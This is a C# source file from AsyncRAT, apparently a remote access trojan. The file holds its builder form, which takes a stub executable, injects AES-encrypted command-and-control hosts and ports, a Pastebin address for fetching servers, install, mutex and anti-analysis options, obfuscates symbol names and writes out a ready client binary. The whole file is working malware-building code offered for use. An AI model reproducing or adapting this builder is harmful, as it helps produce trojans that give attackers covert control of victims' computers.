using System;
using System.Windows.Forms;
using Mono.Cecil;
using AsyncRAT_Sharp.Helper;
using Mono.Cecil.Cil;
using System.Text;
using System.Security.Cryptography;
using AsyncRAT_Sharp.Cryptography;
using System.Security.Cryptography.X509Certificates;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormBuilder : Form
    {
        public FormBuilder()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textIP.Text) || string.IsNullOrWhiteSpace(textPort.Text)) return;

            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }

            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(20);

            if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text)) return;

            try
            {
                using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(@"Stub/Stub.exe"))
                {
                    WriteSettings(asmDef);

                    Renamer r = new Renamer(asmDef);

                    if (!r.Perform())
                        throw new Exception("renaming failed");

                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                        saveFileDialog1.InitialDirectory = Application.StartupPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            r.AsmDef.Write(saveFileDialog1.FileName);
                            MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            Properties.Settings.Default.Save();
                            r.AsmDef.Dispose();
                            this.Close();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "ON";
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
            }
            else
            {
                checkBox1.Text = "OFF";
                textFilename.Enabled = false;
                comboBoxFolder.Enabled = false;
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            comboBoxFolder.SelectedIndex = 0;
            if (Properties.Settings.Default.IP.Length == 0)
                textIP.Text = "127.0.0.1,127.0.0.1";
            if (Properties.Settings.Default.Pastebin.Length == 0)
                txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";
        }

        private void WriteSettings(AssemblyDefinition asmDef)
        {
            var key = Methods.GetRandomString(32);
            var aes = new Aes256(key);
            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
            byte[] signature;
            using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
            }

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "Client.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    string operand = methodDef.Body.Instructions[i].Operand.ToString();

                                    if (operand == "%Ports%")
                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(textPort.Text);

                                    if (operand == "%Hosts%")
                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(textIP.Text);

                                    if (operand == "%Install%")
                                        methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();

                                    if (operand == "%Folder%")
                                        methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;

                                    if (operand == "%File%")
                                        methodDef.Body.Instructions[i].Operand = textFilename.Text;

                                    if (operand == "%Key%")
                                        methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));

                                    if (operand == "%MTX%")
                                        methodDef.Body.Instructions[i].Operand = txtMutex.Text;

                                    if (operand == "%Anti%")
                                        methodDef.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();

                                    if (operand == "%Certificate%")
                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));

                                    if (operand == "%Serversignature%")
                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));

                                    if (operand == "%BDOS%")
                                        methodDef.Body.Instructions[i].Operand = chkBdos.Checked.ToString().ToLower();

                                    if (operand == "%Pastebin%")
                                        if (chkPastebin.Checked)
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
                                        else
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                }
                            }
                        }
                    }
                }
            }

        }

        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (chkPastebin.Checked)
            {
                txtPastebin.Enabled = true;
                textIP.Enabled = false;
                textPort.Enabled = false;
            }
            else
            {
                txtPastebin.Enabled = false;
                textIP.Enabled = true;
                textPort.Enabled = true;
            }
        }
    }
}